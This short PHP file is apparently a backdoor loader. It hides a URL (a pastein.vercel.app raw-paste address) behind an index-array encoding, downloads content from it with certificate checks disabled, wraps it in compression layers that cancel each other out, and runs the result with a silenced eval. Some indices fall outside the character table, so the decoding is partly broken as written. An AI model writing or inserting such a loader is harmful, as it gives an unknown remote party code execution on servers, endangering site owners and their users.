<?php

$characters = array_merge(range('a', 'z'), range('A', 'Z'), range('0', '9'), ['.', ':', '/', '_', '-']);
$indexArray = [7, 19, 19, 15, 18, 63, 64, 64, 15, 0, 18, 19, 4, 8, 13, 62, 21, 4, 17, 2, 4, 11, 62, 0, 15, 15, 64, 0, 15, 8, 64, 17, 0, 22, 67, 15, 68, 55, 1, 4, 55, 54, 61, 4, 53, 66, 4, 60, 58, 1, 66, 56, 60, 0, 3, 66, 60, 55, 60, 3, 66, 2, 57, 2, 60, 57, 61, 4, 0, 56, 60, 53, 61];
$decodedString = '';
foreach ($indexArray as $index) {
    $decodedString .= $characters[$index];
}
$url = "$decodedString";
function fetchContent($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($ch);
    curl_close($ch);
    return gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress($content))))))));
}
@eval("?>".gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(fetchContent($url))))))))));
?>
